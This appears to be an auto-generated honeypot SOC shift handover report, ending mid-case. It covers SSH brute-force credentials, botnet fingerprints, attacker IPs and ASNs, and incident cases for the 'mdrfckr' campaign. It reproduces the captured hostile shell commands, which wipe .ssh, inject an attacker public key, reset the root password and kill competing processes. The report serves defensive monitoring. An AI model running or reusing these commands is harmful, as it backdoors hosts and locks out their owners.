# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T21:04:02Z |
| **Shift Time** | 21:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **94** |
| Confirmed Threats | **91** |
| False Positives Filtered | **3** (3.2%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **13** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **10** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 13 |
| `sammy` | 2 |
| `sandeep` | 2 |
| `test2` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `123456` | 4 |
| `123` | 3 |
| `sandeep` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `sammy` | `123` | 2 |
| `sandeep` | `sandeep` | 2 |
| `root` | `aa123456.` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `163.245.213.245` | 2026-05-31T19:25:42 |
| `root` | `aa123456.` | `186.31.95.163` | 2026-05-31T19:44:27 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-31T19:44:34 |
| `root` | `KS@gshyx@zl1651` | `186.31.95.163` | 2026-05-31T19:57:51 |
| `root` | `Nihao123` | `186.31.95.163` | 2026-05-31T19:59:49 |
| `root` | `Nihao123` | `114.141.59.195` | 2026-05-31T20:00:32 |
| `root` | `3245gs5662d34` | `114.141.59.195` | 2026-05-31T20:00:36 |
| `root` | `aa123456.` | `114.141.59.195` | 2026-05-31T20:12:44 |
| `root` | `Qq123456@` | `154.57.216.142` | 2026-05-31T20:17:12 |
| `root` | `3245gs5662d34` | `154.57.216.142` | 2026-05-31T20:17:16 |
| `root` | `Qwerty123@` | `175.115.87.134` | 2026-05-31T20:22:03 |
| `root` | `3245gs5662d34` | `175.115.87.134` | 2026-05-31T20:22:07 |
| `root` | `Zxcasd123` | `114.141.59.195` | 2026-05-31T20:24:56 |
| `root` | `alpha001` | `101.126.26.93` | 2026-05-31T20:26:42 |
| `root` | `3245gs5662d34` | `101.126.26.93` | 2026-05-31T20:26:48 |
| `root` | `xsw2!QAZ` | `101.126.26.93` | 2026-05-31T20:28:43 |
| `root` | `A1s2d3f4g5` | `101.126.26.93` | 2026-05-31T20:30:56 |
| `root` | `KS@gshyx@zl1651` | `114.141.59.195` | 2026-05-31T20:31:02 |
| `root` | `root@123456` | `101.126.26.93` | 2026-05-31T20:50:17 |
| `root` | `Pass@123456` | `101.126.26.93` | 2026-05-31T20:52:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **94** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 38 | 4 |
| `af8223ac9914...` | libssh-based | 18 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 38 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 18 | 1 | libssh-based |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:L98soSWbHlBR"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.26.93`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `154.57.216.142`, `175.115.87.134`, `186.31.95.163`, `114.141.59.195`, `101.126.26.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **16** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | LOW |
| `AS53107` | EVEO S.A. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-736458e33930

| Field | Detail |
|---|---|
| **Source IP** | `163.245.213[.]245` |
| **First Seen** | 2026-05-31 19:25 |
| **Last Seen** | 2026-05-31 19:28 |
| **Session Duration** | 160s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:25:40` | `cowrie.session.connect` |
| `2026-05-31 19:25:40` | `cowrie.client.version` |
| `2026-05-31 19:25:41` | `cowrie.client.kex` |
| `2026-05-31 19:25:42` | `cowrie.login.success` |
| `2026-05-31 19:28:20` | `cowrie.session.file_upload` |
| `2026-05-31 19:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.245.213[.]245` to AbuseIPDB if not already reported
- [ ] Block `163.245.213[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84cea3bb711

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:44 |
| **Last Seen** | 2026-05-31 19:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:44:26` | `cowrie.session.connect` |
| `2026-05-31 19:44:26` | `cowrie.client.version` |
| `2026-05-31 19:44:26` | `cowrie.client.kex` |
| `2026-05-31 19:44:27` | `cowrie.login.success` |
| `2026-05-31 19:44:28` | `cowrie.session.params` |
| `2026-05-31 19:44:28` | `cowrie.command.input` |
| `2026-05-31 19:44:28` | `cowrie.command.failed` |
| `2026-05-31 19:44:28` | `cowrie.log.closed` |
| `2026-05-31 19:44:29` | `cowrie.session.params` |
| `2026-05-31 19:44:29` | `cowrie.command.input` |
| `2026-05-31 19:44:29` | `cowrie.session.file_download` |
| `2026-05-31 19:44:29` | `cowrie.log.closed` |
| `2026-05-31 19:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee8d1c74b036

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:44 |
| **Last Seen** | 2026-05-31 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:44:32` | `cowrie.session.connect` |
| `2026-05-31 19:44:32` | `cowrie.client.version` |
| `2026-05-31 19:44:32` | `cowrie.client.kex` |
| `2026-05-31 19:44:34` | `cowrie.login.success` |
| `2026-05-31 19:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ed19b9741c

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:57 |
| **Last Seen** | 2026-05-31 19:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:57:49` | `cowrie.session.connect` |
| `2026-05-31 19:57:49` | `cowrie.client.version` |
| `2026-05-31 19:57:50` | `cowrie.client.kex` |
| `2026-05-31 19:57:51` | `cowrie.login.success` |
| `2026-05-31 19:57:51` | `cowrie.session.params` |
| `2026-05-31 19:57:51` | `cowrie.command.input` |
| `2026-05-31 19:57:51` | `cowrie.command.failed` |
| `2026-05-31 19:57:52` | `cowrie.log.closed` |
| `2026-05-31 19:57:52` | `cowrie.session.params` |
| `2026-05-31 19:57:52` | `cowrie.command.input` |
| `2026-05-31 19:57:53` | `cowrie.session.file_download` |
| `2026-05-31 19:57:53` | `cowrie.log.closed` |
| `2026-05-31 19:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cb515ef543

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:57 |
| **Last Seen** | 2026-05-31 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:57:56` | `cowrie.session.connect` |
| `2026-05-31 19:57:56` | `cowrie.client.version` |
| `2026-05-31 19:57:56` | `cowrie.client.kex` |
| `2026-05-31 19:57:57` | `cowrie.login.success` |
| `2026-05-31 19:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b5f876ebec

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:59 |
| **Last Seen** | 2026-05-31 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:59:47` | `cowrie.session.connect` |
| `2026-05-31 19:59:47` | `cowrie.client.version` |
| `2026-05-31 19:59:48` | `cowrie.client.kex` |
| `2026-05-31 19:59:49` | `cowrie.login.success` |
| `2026-05-31 19:59:49` | `cowrie.session.params` |
| `2026-05-31 19:59:49` | `cowrie.command.input` |
| `2026-05-31 19:59:49` | `cowrie.command.failed` |
| `2026-05-31 19:59:50` | `cowrie.log.closed` |
| `2026-05-31 19:59:50` | `cowrie.session.params` |
| `2026-05-31 19:59:50` | `cowrie.command.input` |
| `2026-05-31 19:59:51` | `cowrie.session.file_download` |
| `2026-05-31 19:59:51` | `cowrie.log.closed` |
| `2026-05-31 19:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17bbe5121299

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-31 19:59 |
| **Last Seen** | 2026-05-31 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 19:59:54` | `cowrie.session.connect` |
| `2026-05-31 19:59:54` | `cowrie.client.version` |
| `2026-05-31 19:59:54` | `cowrie.client.kex` |
| `2026-05-31 19:59:55` | `cowrie.login.success` |
| `2026-05-31 19:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115b37fd35c0

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:00 |
| **Last Seen** | 2026-05-31 20:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:00:30` | `cowrie.session.connect` |
| `2026-05-31 20:00:31` | `cowrie.client.version` |
| `2026-05-31 20:00:31` | `cowrie.client.kex` |
| `2026-05-31 20:00:32` | `cowrie.login.success` |
| `2026-05-31 20:00:32` | `cowrie.session.params` |
| `2026-05-31 20:00:32` | `cowrie.command.input` |
| `2026-05-31 20:00:32` | `cowrie.command.failed` |
| `2026-05-31 20:00:32` | `cowrie.log.closed` |
| `2026-05-31 20:00:33` | `cowrie.session.params` |
| `2026-05-31 20:00:33` | `cowrie.command.input` |
| `2026-05-31 20:00:33` | `cowrie.session.file_download` |
| `2026-05-31 20:00:33` | `cowrie.log.closed` |
| `2026-05-31 20:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14daf6adc0dd

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:00 |
| **Last Seen** | 2026-05-31 20:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:00:35` | `cowrie.session.connect` |
| `2026-05-31 20:00:35` | `cowrie.client.version` |
| `2026-05-31 20:00:36` | `cowrie.client.kex` |
| `2026-05-31 20:00:36` | `cowrie.login.success` |
| `2026-05-31 20:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec4b79d653c

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:12 |
| **Last Seen** | 2026-05-31 20:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:12:43` | `cowrie.session.connect` |
| `2026-05-31 20:12:43` | `cowrie.client.version` |
| `2026-05-31 20:12:43` | `cowrie.client.kex` |
| `2026-05-31 20:12:44` | `cowrie.login.success` |
| `2026-05-31 20:12:44` | `cowrie.session.params` |
| `2026-05-31 20:12:44` | `cowrie.command.input` |
| `2026-05-31 20:12:44` | `cowrie.command.failed` |
| `2026-05-31 20:12:44` | `cowrie.log.closed` |
| `2026-05-31 20:12:45` | `cowrie.session.params` |
| `2026-05-31 20:12:45` | `cowrie.command.input` |
| `2026-05-31 20:12:45` | `cowrie.session.file_download` |
| `2026-05-31 20:12:45` | `cowrie.log.closed` |
| `2026-05-31 20:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929ae9e62770

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:12 |
| **Last Seen** | 2026-05-31 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:12:47` | `cowrie.session.connect` |
| `2026-05-31 20:12:47` | `cowrie.client.version` |
| `2026-05-31 20:12:48` | `cowrie.client.kex` |
| `2026-05-31 20:12:48` | `cowrie.login.success` |
| `2026-05-31 20:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ad0e215b72

| Field | Detail |
|---|---|
| **Source IP** | `154.57.216[.]142` |
| **First Seen** | 2026-05-31 20:17 |
| **Last Seen** | 2026-05-31 20:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:17:11` | `cowrie.session.connect` |
| `2026-05-31 20:17:11` | `cowrie.client.version` |
| `2026-05-31 20:17:12` | `cowrie.client.kex` |
| `2026-05-31 20:17:12` | `cowrie.login.success` |
| `2026-05-31 20:17:13` | `cowrie.session.params` |
| `2026-05-31 20:17:13` | `cowrie.command.input` |
| `2026-05-31 20:17:13` | `cowrie.command.failed` |
| `2026-05-31 20:17:13` | `cowrie.log.closed` |
| `2026-05-31 20:17:13` | `cowrie.session.params` |
| `2026-05-31 20:17:13` | `cowrie.command.input` |
| `2026-05-31 20:17:13` | `cowrie.session.file_download` |
| `2026-05-31 20:17:13` | `cowrie.log.closed` |
| `2026-05-31 20:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.57.216[.]142` to AbuseIPDB if not already reported
- [ ] Block `154.57.216[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29c1cd68ac1c

| Field | Detail |
|---|---|
